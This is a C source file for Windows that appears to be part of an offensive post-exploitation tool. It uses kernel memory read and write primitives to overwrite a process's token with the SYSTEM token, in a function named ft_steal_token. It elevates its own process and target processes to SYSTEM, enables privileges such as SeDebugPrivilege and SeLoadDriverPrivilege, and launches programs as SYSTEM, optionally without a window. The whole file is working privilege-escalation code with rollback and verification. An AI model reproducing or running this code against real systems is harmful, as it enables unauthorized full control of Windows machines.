#include "ft.h"

#include <string.h>

static int ft_token_id_of_handle(HANDLE proc, uint64_t* token_id) {
    HANDLE tok = NULL;
    TOKEN_STATISTICS ts;
    DWORD sz = 0;
    int ok = 0;

    if (!proc || !token_id) return 0;
    *token_id = 0;
    if (!OpenProcessToken(proc, TOKEN_QUERY, &tok)) return 0;
    if (GetTokenInformation(tok, TokenStatistics, &ts, sizeof ts, &sz)) {
        *token_id = ((uint64_t)(uint32_t)ts.TokenId.HighPart << 32) |
                    (uint32_t)ts.TokenId.LowPart;
        ok = 1;
    }
    CloseHandle(tok);
    return ok;
}

static int ft_system_token_luid(ft_ctx* c, uint64_t* luid) {
    uint64_t sys_tok = 0;
    uint64_t id = 0;

    if (c->sys_token == 0) {
        if (ft_km_read64(c, c->sys_ep + c->ep_token_off, &sys_tok) != FTR_VAL ||
            !ft_is_kernel_ptr(sys_tok)) {
            return 0;
        }
        c->sys_token = sys_tok;
    }
    if (ft_km_read64(c, (c->sys_token & ~0xFULL) + c->ep_luid_delta, &id) != FTR_VAL) {
        return 0;
    }
    if (id == 0) return 0;
    *luid = id;
    return 1;
}

static int ft_effective_privileged(void) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL,
                                    SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (!scm) return 0;
    CloseServiceHandle(scm);
    return 1;
}

static int ft_steal_token(ft_ctx* c, uint64_t target_ep, uint64_t* orig_out,
                          uint64_t* new_out) {
    uint64_t sys_tok = 0;
    uint64_t tgt_tok = 0;
    uint64_t new_tok = 0;
    uint64_t verify = 0;

    if (ft_km_read64(c, c->sys_ep + c->ep_token_off, &sys_tok) != FTR_VAL ||
        !ft_is_kernel_ptr(sys_tok)) {
        ft_err(c, "elev_no_sys_token", "\"sys_ep\":\"0x%llx\"",
               (unsigned long long)c->sys_ep);
        return FT_E_VALIDATE;
    }
    c->sys_token = sys_tok;

    if (ft_km_read64(c, target_ep + c->ep_token_off, &tgt_tok) != FTR_VAL ||
        !ft_is_kernel_ptr(tgt_tok)) {
        ft_err(c, "elev_no_target_token", "\"eproc\":\"0x%llx\"",
               (unsigned long long)target_ep);
        return FT_E_VALIDATE;
    }

    new_tok = sys_tok;
    if (!ft_is_kernel_ptr(new_tok)) {
        ft_err(c, "elev_bad_new_token", "\"new\":\"0x%llx\"",
               (unsigned long long)new_tok);
        return FT_E_VALIDATE;
    }
    {
        uint64_t masked_id = 0;
        uint64_t raw_id = 0;
        if (ft_km_read64(c, new_tok & ~0xFULL, &masked_id) != FTR_VAL ||
            ft_km_read64(c, sys_tok & ~0xFULL, &raw_id) != FTR_VAL ||
            masked_id != raw_id) {
            ft_err(c, "elev_token_unverified", "\"new\":\"0x%llx\"",
                   (unsigned long long)new_tok);
            return FT_E_VALIDATE;
        }
    }

    if (orig_out) *orig_out = tgt_tok;
    if (new_out) *new_out = new_tok;

    if (c->dry_run) {
        ft_ok(c, "elev_dryrun", "\"old\":\"0x%llx\",\"new\":\"0x%llx\"",
              (unsigned long long)tgt_tok, (unsigned long long)new_tok);
        return FT_OK;
    }

    if (ft_km_write64(c, target_ep + c->ep_token_off, new_tok) != 1) {
        ft_err(c, "elev_write_failed", "\"eproc\":\"0x%llx\"",
               (unsigned long long)target_ep);
        return FT_E_ACTION;
    }
    if (ft_km_read64(c, target_ep + c->ep_token_off, &verify) != FTR_VAL ||
        (verify != new_tok)) {
        int rb = ft_km_write64(c, target_ep + c->ep_token_off, tgt_tok);
        ft_err(c, "elev_verify_failed", "\"rollback\":%d,\"readback\":\"0x%llx\"",
               rb ? 1 : 0, (unsigned long long)verify);
        return FT_E_VERIFY;
    }
    return FT_OK;
}

static int ft_enable_privilege(const char* name);

static int ft_duplicate_primary_token(uint32_t pid, HANDLE* out);

int ft_enable_all_privileges(ft_ctx* c) {
    int n = 0;
    (void)c;
    if (ft_enable_privilege("SeDebugPrivilege")) n++;
    if (ft_enable_privilege("SeImpersonatePrivilege")) n++;
    if (ft_enable_privilege("SeAssignPrimaryTokenPrivilege")) n++;
    if (ft_enable_privilege("SeIncreaseQuotaPrivilege")) n++;
    if (ft_enable_privilege("SeTakeOwnershipPrivilege")) n++;
    if (ft_enable_privilege("SeBackupPrivilege")) n++;
    if (ft_enable_privilege("SeRestorePrivilege")) n++;
    if (ft_enable_privilege("SeLoadDriverPrivilege")) n++;
    return n;
}

void ft_revert_impersonation(ft_ctx* c) {
    if (!c || !c->impersonating) return;
    SetThreadToken(NULL, NULL);
    c->impersonating = 0;
}

int ft_elevate_self(ft_ctx* c) {
    uint64_t self_ep = 0;
    uint64_t orig = 0, newtok = 0;
    uint64_t sys_luid = 0, got_luid = 0;
    uint32_t self_pid = ft_proc_self_pid();
    int rc;
    ft_sb f;

    if (!c) return FT_E_INTERNAL;
    if (ft_proc_is_system(c)) {
        ft_ok(c, "elev_self_already_system", "\"pid\":%u", self_pid);
        return FT_OK;
    }
    if (!ft_proc_find_by_pid(c, self_pid, &self_ep) || !self_ep) {
        ft_err(c, "elev_self_notfound", "\"pid\":%u", self_pid);
        return FT_E_TARGET;
    }
    if (!ft_system_token_luid(c, &sys_luid)) {
        ft_err(c, "elev_no_sys_luid", "");
        return FT_E_VALIDATE;
    }

    rc = ft_steal_token(c, self_ep, &orig, &newtok);
    if (rc != FT_OK) return rc;
    if (c->dry_run) return FT_OK;

    if (!ft_token_id_of_handle(GetCurrentProcess(), &got_luid)) {
        ft_warn(c, "elev_self_no_token_query", "\"pid\":%u", self_pid);
    } else if (got_luid != sys_luid) {
        ft_warn(c, "elev_self_thread_token_stale",
                "\"pid\":%u,\"thread_luid\":\"0x%llx\",\"system_luid\":\"0x%llx\"",
                self_pid, (unsigned long long)got_luid,
                (unsigned long long)sys_luid);
    } else {
        ft_ok(c, "elev_self_token_live", "\"pid\":%u", self_pid);
    }

    if (!ft_effective_privileged()) {
        ft_warn(c, "elev_self_privilege_probe", "\"pid\":%u", self_pid);
    }

    ft_sb_init(&f);
    ft_sb_addf(&f, "\"pid\":%u,\"eproc\":\"0x%llx\",\"token\":\"0x%llx\"",
               self_pid, (unsigned long long)self_ep,
               (unsigned long long)newtok);
    ft_ok(c, "elev_self", f.buf);
    ft_sb_free(&f);
    return FT_OK;
}

int ft_elevate_pid(ft_ctx* c, uint32_t pid) {
    uint64_t eproc = 0;
    uint64_t orig = 0, newtok = 0;
    uint64_t sys_luid = 0, got_luid = 0;
    int rc;
    ft_sb f;

    if (!c) return FT_E_INTERNAL;
    if (pid == 0) return FT_E_ARGS;

    if (!ft_proc_find_by_pid(c, pid, &eproc) || !eproc) {
        ft_err(c, "elev_pid_notfound", "\"pid\":%u", pid);
        return FT_E_TARGET;
    }
    if (!ft_system_token_luid(c, &sys_luid)) {
        ft_err(c, "elev_no_sys_luid", "");
        return FT_E_VALIDATE;
    }
    rc = ft_steal_token(c, eproc, &orig, &newtok);
    if (rc != FT_OK) return rc;
    if (c->dry_run) return FT_OK;

    if (!ft_token_id_of_process(c, pid, &got_luid)) {
        ft_warn(c, "elev_pid_no_token_query", "\"pid\":%u", pid);
    } else if (got_luid != sys_luid) {
        ft_err(c, "elev_pid_luid_mismatch",
               "\"pid\":%u,\"got\":\"0x%llx\",\"want\":\"0x%llx\"", pid,
               (unsigned long long)got_luid, (unsigned long long)sys_luid);
        (void)ft_km_write64(c, eproc + c->ep_token_off, orig);
        return FT_E_VERIFY;
    }

    ft_sb_init(&f);
    ft_sb_addf(&f, "\"pid\":%u,\"eproc\":\"0x%llx\",\"token\":\"0x%llx\"",
               pid, (unsigned long long)eproc, (unsigned long long)newtok);
    ft_ok(c, "elev_pid", f.buf);
    ft_sb_free(&f);
    return FT_OK;
}

static void ft_append_quoted(char* buf, size_t cap, size_t* len, const char* arg) {
    const char* p;
    size_t need;
    if (!arg) return;
    need = strlen(arg) * 2 + 8;
    if (*len + need >= cap) return;
    buf[(*len)++] = ' ';
    buf[(*len)++] = '"';
    for (p = arg; *p; p++) {
        if (*p == '\\') {
            size_t bs = 0;
            size_t i;
            while (p[bs] == '\\') bs++;
            if (p[bs] == '"') {
                for (i = 0; i < bs * 2; i++) buf[(*len)++] = '\\';
            } else if (p[bs] == '\0') {
                for (i = 0; i < bs * 2; i++) buf[(*len)++] = '\\';
            } else {
                for (i = 0; i < bs; i++) buf[(*len)++] = '\\';
            }
            p += bs - 1;
        } else if (*p == '"') {
            buf[(*len)++] = '\\';
            buf[(*len)++] = '"';
        } else {
            buf[(*len)++] = *p;
        }
    }
    buf[(*len)++] = '"';
    buf[*len] = '\0';
}

static int ft_build_cmdline(char* out, size_t cap, const char* exe,
                            char* const* argv) {
    size_t len = 0;
    int i;

    if (!out || cap < 8) return 0;
    if (!exe) return 0;
    out[0] = '\0';

    ft_append_quoted(out, cap, &len, exe);
    if (len > 0 && out[0] == ' ') {
        memmove(out, out + 1, len);
        len--;
        out[len] = '\0';
    }
    if (len > cap - 2) { len = cap - 2; out[len] = '\0'; }
    if (argv) {
        for (i = 0; argv[i] && i < FT_MAX_ARGS; i++) {
            ft_append_quoted(out, cap, &len, argv[i]);
        }
    }
    out[len] = '\0';
    return 1;
}

static int ft_enable_privilege(const char* name) {
    TOKEN_PRIVILEGES tp;
    HANDLE tok = NULL;
    BOOL ok;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) {
        return 0;
    }
    memset(&tp, 0, sizeof tp);
    tp.PrivilegeCount = 1;
    if (!LookupPrivilegeValueA(NULL, name, &tp.Privileges[0].Luid)) {
        CloseHandle(tok);
        return 0;
    }
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    SetLastError(ERROR_SUCCESS);
    ok = AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    if (!ok || GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(tok);
        return 0;
    }
    CloseHandle(tok);
    return 1;
}

static int ft_duplicate_primary_token(uint32_t pid, HANDLE* out) {
    HANDLE p = NULL;
    HANDLE tok = NULL;
    HANDLE dup = NULL;
    int ok = 0;

    if (!out) return 0;
    *out = NULL;
    p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!p) p = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!p) return 0;
    if (!OpenProcessToken(p, TOKEN_DUPLICATE | TOKEN_QUERY, &tok)) {
        CloseHandle(p);
        return 0;
    }
    if (DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                          TokenPrimary, &dup)) {
        *out = dup;
        ok = 1;
    }
    CloseHandle(tok);
    CloseHandle(p);
    return ok;
}

int ft_launch_system(ft_ctx* c, const char* exe, char* const* argv, int visible,
                     uint32_t* child_pid) {
    char cmd[4096];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    DWORD flags = visible ? 0 : CREATE_NO_WINDOW;
    uint64_t sys_luid = 0, got_luid = 0;
    int rc;
    ft_sb f;

    if (!c || !exe || !*exe) return FT_E_ARGS;
    if (child_pid) *child_pid = 0;

    ft_enable_privilege("SeAssignPrimaryTokenPrivilege");
    ft_enable_privilege("SeImpersonatePrivilege");
    ft_enable_privilege("SeIncreaseQuotaPrivilege");
    ft_enable_privilege("SeDebugPrivilege");

    if (!ft_proc_is_system(c)) {
        ft_info(c, "launch_elevating", "\"exe\":\"%s\"", exe);
        rc = ft_elevate_self(c);
        if (rc != FT_OK) return rc;
    }
    if (!ft_build_cmdline(cmd, sizeof cmd, exe, argv)) {
        ft_err(c, "launch_cmdline", "");
        return FT_E_ARGS;
    }
    if (c->dry_run) {
        ft_ok(c, "launch_dryrun", "\"cmd\":\"%s\"", cmd);
        return FT_OK;
    }

    memset(&si, 0, sizeof si);
    si.cb = sizeof si;
    memset(&pi, 0, sizeof pi);
    ft_info(c, "launch_creating", "\"exe\":\"%s\"", exe);
    if (!CreateProcessA(exe, cmd, NULL, NULL, FALSE, flags, NULL, NULL, &si, &pi)) {
        ft_err(c, "launch_create_failed", "\"exe\":\"%s\",\"err\":%lu", exe,
               GetLastError());
        return FT_E_ACTION;
    }
    ft_info(c, "launch_created", "\"pid\":%u", (unsigned)pi.dwProcessId);
    if (child_pid) *child_pid = (uint32_t)pi.dwProcessId;

    rc = ft_elevate_pid(c, (uint32_t)pi.dwProcessId);
    if (rc != FT_OK) {
        ft_err(c, "launch_child_token_failed", "\"pid\":%u,\"rc\":%d",
               (unsigned)pi.dwProcessId, rc);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return rc;
    }
    if (!ft_system_token_luid(c, &sys_luid)) sys_luid = 0;
    if (ft_token_id_of_handle(pi.hProcess, &got_luid) && sys_luid &&
        got_luid != sys_luid) {
        ft_err(c, "launch_token_mismatch",
               "\"pid\":%u,\"child_luid\":\"0x%llx\",\"system_luid\":\"0x%llx\"",
               (unsigned)pi.dwProcessId, (unsigned long long)got_luid,
               (unsigned long long)sys_luid);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FT_E_VERIFY;
    }

    {
        DWORD code = 0;
        if (WaitForSingleObject(pi.hProcess, 800) == WAIT_OBJECT_0 &&
            GetExitCodeProcess(pi.hProcess, &code)) {
            ft_info(c, "launch_child_exit", "\"pid\":%u,\"code\":%lu",
                    (unsigned)pi.dwProcessId, (unsigned long)code);
        } else {
            ft_info(c, "launch_child_running", "\"pid\":%u",
                    (unsigned)pi.dwProcessId);
        }
    }

    ft_sb_init(&f);
    ft_sb_addf(&f, "\"pid\":%u,\"cmd\":", (unsigned)pi.dwProcessId);
    ft_sb_addj(&f, cmd);
    ft_sb_addf(&f, ",\"system\":%d", got_luid == sys_luid ? 1 : 0);
    ft_ok(c, "launch", f.buf);
    ft_sb_free(&f);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return FT_OK;
}

int ft_launch_as_pid(ft_ctx* c, uint32_t pid, const char* exe, char* const* argv,
                     int visible, uint32_t* child_pid) {
    char cmd[4096];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    HANDLE hDup = NULL;
    uint64_t sys_luid = 0, got_luid = 0;
    DWORD flags = visible ? 0 : CREATE_NO_WINDOW;
    int rc;
    ft_sb f;

    if (!c || !exe || !*exe) return FT_E_ARGS;
    if (child_pid) *child_pid = 0;

    if (!ft_proc_is_system(c)) {
        rc = ft_elevate_self(c);
        if (rc != FT_OK) return rc;
    }

    if (!ft_token_id_of_process(c, pid, &got_luid)) {
        ft_err(c, "launchas_no_token", "\"pid\":%u", pid);
        return FT_E_TARGET;
    }
    if (ft_system_token_luid(c, &sys_luid) && got_luid != sys_luid) {
        ft_err(c, "launchas_not_system", "\"pid\":%u", pid);
        return FT_E_VALIDATE;
    }

    if (!ft_duplicate_primary_token(pid, &hDup)) {
        ft_err(c, "launchas_dup", "\"pid\":%u,\"err\":%lu", pid, GetLastError());
        return FT_E_PRIV;
    }

    if (!ft_build_cmdline(cmd, sizeof cmd, exe, argv)) {
        CloseHandle(hDup);
        ft_err(c, "launch_cmdline", "");
        return FT_E_ARGS;
    }
    if (c->dry_run) {
        CloseHandle(hDup);
        ft_ok(c, "launchas_dryrun", "\"pid\":%u,\"cmd\":\"%s\"", pid, cmd);
        return FT_OK;
    }

    memset(&si, 0, sizeof si);
    si.cb = sizeof si;
    memset(&pi, 0, sizeof pi);
    {
        wchar_t wcmd[4096];
        STARTUPINFOW wsi;
        memset(wcmd, 0, sizeof wcmd);
        if (!MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, 4096)) {
            CloseHandle(hDup);
            ft_err(c, "launchas_wide", "\"err\":%lu", GetLastError());
            return FT_E_ACTION;
        }
        memset(&wsi, 0, sizeof wsi);
        wsi.cb = (DWORD)sizeof wsi;
        if (!CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE, NULL, wcmd, flags,
                                     NULL, NULL, &wsi, &pi)) {
            CloseHandle(hDup);
            ft_err(c, "launchas_create_failed", "\"err\":%lu", GetLastError());
            return FT_E_ACTION;
        }
    }
    CloseHandle(hDup);
    if (child_pid) *child_pid = (uint32_t)pi.dwProcessId;

    ft_sb_init(&f);
    ft_sb_addf(&f, "\"host_pid\":%u,\"pid\":%u,\"cmd\":\"%s\"", pid,
               (unsigned)pi.dwProcessId, cmd);
    ft_ok(c, "launchas", f.buf);
    ft_sb_free(&f);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return FT_OK;
}
